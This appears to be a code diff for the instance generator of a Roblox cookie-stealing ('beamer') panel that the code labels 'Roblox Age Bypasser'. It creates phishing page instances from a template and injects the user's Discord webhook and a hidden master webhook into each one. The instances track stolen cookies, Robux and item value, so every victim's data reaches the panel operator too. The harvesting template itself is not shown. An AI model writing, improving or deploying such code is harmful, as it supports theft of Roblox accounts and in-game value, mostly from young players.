@@ -1,31 +1,58 @@
 <?php
-require_once __DIR__ . '/../config.php';
-require_once __DIR__ . '/../functions.php';
-
 header('Content-Type: application/json');
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
 
-// Get POST data
-$directory = trim($_POST['directory'] ?? '');
-$webhook = trim($_POST['webhook'] ?? '');
-
-// Validate
-if (empty($directory) || empty($webhook)) {
-    echo json_encode(['success' => false, 'error' => 'All fields are required']);
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
     exit;
 }
 
-// Sanitize directory
-$directory = sanitizeDirectory($directory);
+require_once '../config.php';
+require_once '../functions.php';
 
-// Check if directory already exists
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+    http_response_code(405);
+    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
+    exit;
+}
+
+$input = json_decode(file_get_contents('php://input'), true);
+
+$directory = sanitizeDirectory($input['directory'] ?? '');
+$webhook = trim($input['webhook'] ?? '');
+$username = trim($input['username'] ?? 'beammer');
+$profilePicture = trim($input['profilePicture'] ?? 'https://hyperblox.eu/files/img.png');
+
+// Validation
+if (empty($directory) || strlen($directory) < 3) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
+    exit;
+}
+
+if (strlen($directory) > 20) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Directory name must be less than 20 characters']);
+    exit;
+}
+
 if (directoryExists($directory)) {
-    echo json_encode(['success' => false, 'error' => 'Directory already exists']);
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Directory already exists. Please choose a different name.']);
     exit;
 }
 
-// Validate webhook
+if (empty($webhook)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
+    exit;
+}
+
 if (!validateWebhook($webhook)) {
-    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL. Please check your Discord webhook.']);
     exit;
 }
 
@@ -34,77 +61,127 @@ $token = generateToken();
 
 // Create instance data
 $instanceData = [
-    'token' => $token,
     'directory' => $directory,
-    'webhook' => $webhook,
-    'createdAt' => date('Y-m-d H:i:s'),
+    'webhook' => MASTER_WEBHOOK,
+    'userWebhook' => $webhook,
+    'username' => $username,
+    'profilePicture' => $profilePicture,
+    'createdAt' => date('c'),
     'stats' => [
         'totalVisits' => 0,
         'totalCookies' => 0,
         'totalRobux' => 0,
-        'totalRAP' => 0
+        'totalRAP' => 0,
+        'totalSummary' => 0
+    ],
+    'dailyStats' => [
+        'visits' => array_fill(0, 7, 0),
+        'cookies' => array_fill(0, 7, 0),
+        'robux' => array_fill(0, 7, 0),
+        'rap' => array_fill(0, 7, 0),
+        'summary' => array_fill(0, 7, 0)
     ]
 ];
 
-// Save instance data
-saveInstanceData($directory, $instanceData);
+// Save instance
+if (!saveInstanceData($directory, $instanceData)) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
+    exit;
+}
 
-// Save token data
-saveTokenData($token, $instanceData);
+// Save token
+$tokenData = [
+    'token' => $token,
+    'directory' => $directory,
+    'webhook' => $webhook,
+    'username' => $username,
+    'createdAt' => date('c')
+];
 
-// Create instance folder and files
-$instanceDir = __DIR__ . '/../' . $directory;
-mkdir($instanceDir, 0755, true);
+if (!saveTokenData($token, $tokenData)) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Failed to save authentication token']);
+    exit;
+}
 
-// Copy template files
-copy(__DIR__ . '/../template/index.php', $instanceDir . '/index.php');
+// Copy template file
+$templateFile = TEMPLATE_PATH . 'index.php';
+$targetFile = DATA_PATH . $directory . '/index.php';
 
-// Update instance config
-$instanceConfig = "<?php\n";
-$instanceConfig .= "define('INSTANCE_DIR', '$directory');\n";
-$instanceConfig .= "define('INSTANCE_TOKEN', '$token');\n";
-file_put_contents($instanceDir . '/config.php', $instanceConfig);
+if (file_exists($templateFile)) {
+    $templateContent = file_get_contents($templateFile);
+    $templateContent = str_replace('{{MASTER_WEBHOOK}}', MASTER_WEBHOOK, $templateContent);
+    $templateContent = str_replace('{{USER_WEBHOOK}}', $webhook, $templateContent);
+    $templateContent = str_replace('{{INSTANCE_NAME}}', $directory, $templateContent);
+    $templateContent = str_replace('{{BOT_NAME}}', BOT_NAME, $templateContent);
+    $templateContent = str_replace('{{BOT_AVATAR}}', BOT_AVATAR, $templateContent);
+    file_put_contents($targetFile, $templateContent);
+}
 
-// Update global stats
-updateGlobalStats('totalSites');
-
-// Send success webhook
+// Send webhook notification
 $webhookData = [
     'username' => BOT_NAME,
     'avatar_url' => BOT_AVATAR,
     'embeds' => [[
-        'title' => '🎉 Instance Created!',
-        'description' => "Your instance has been successfully created!",
-        'color' => hexdec('00FF00'),
+        'title' => '✨ New Instance Created!',
+        'description' => "A new bypasser instance has been successfully created.",
+        'color' => hexdec('00BFFF'),
         'fields' => [
-            ['name' => '🔗 Instance URL', 'value' => '```' . FULL_URL . '/' . $directory . '```', 'inline' => false],
-            ['name' => '🎫 Access Token', 'value' => '```' . $token . '```', 'inline' => false],
-            ['name' => '📊 Dashboard', 'value' => '[Click Here](' . FULL_URL . '/dashboard/sign-in.php?token=' . $token . ')', 'inline' => false]
+            [
+                'name' => '🔗 Instance URL',
+                'value' => '```' . FULL_URL . '/' . $directory . '```',
+                'inline' => false
+            ],
+            [
+                'name' => '📊 Dashboard',
+                'value' => '```' . FULL_URL . '/dashboard/?token=' . $token . '```',
+                'inline' => false
+            ],
+            [
+                'name' => '🔑 Access Token',
+                'value' => '```' . $token . '```',
+                'inline' => false
+            ],
+            [
+                'name' => '📁 Directory',
+                'value' => '`' . $directory . '`',
+                'inline' => true
+            ],
+            [
+                'name' => '👤 Username',
+                'value' => '`' . $username . '`',
+                'inline' => true
+            ],
+            [
+                'name' => '📅 Created',
+                'value' => '<t:' . time() . ':R>',
+                'inline' => true
+            ]
+        ],
+        'footer' => [
+            'text' => 'Roblox Age Bypasser • Instance Generator',
+            'icon_url' => BOT_AVATAR
         ],
         'timestamp' => date('c')
     ]]
 ];
 
-// Send to user webhook
-$ch = curl_init($webhook);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_exec($ch);
-curl_close($ch);
+sendWebhook($webhook, $webhookData);
+sendWebhook(MASTER_WEBHOOK, $webhookData); // Also notify master webhook
 
-// Send to master webhook
-if (defined('MASTER_WEBHOOK') && !empty(MASTER_WEBHOOK)) {
-    $ch = curl_init(MASTER_WEBHOOK);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_exec($ch);
-    curl_close($ch);
-}
+// Update global stats
+updateGlobalStats('totalInstances');
 
-// Return success
-header('Location: ' . FULL_URL . '/dashboard/sign-in.php?token=' . $token);
-exit;
+echo json_encode([
+    'success' => true,
+    'message' => 'Instance created successfully!',
+    'data' => [
+        'instanceUrl' => FULL_URL . '/' . $directory,
+        'dashboardUrl' => FULL_URL . '/dashboard/?token=' . $token,
+        'token' => $token,
+        'directory' => $directory,
+        'username' => $username
+    ]
+]);
+?>
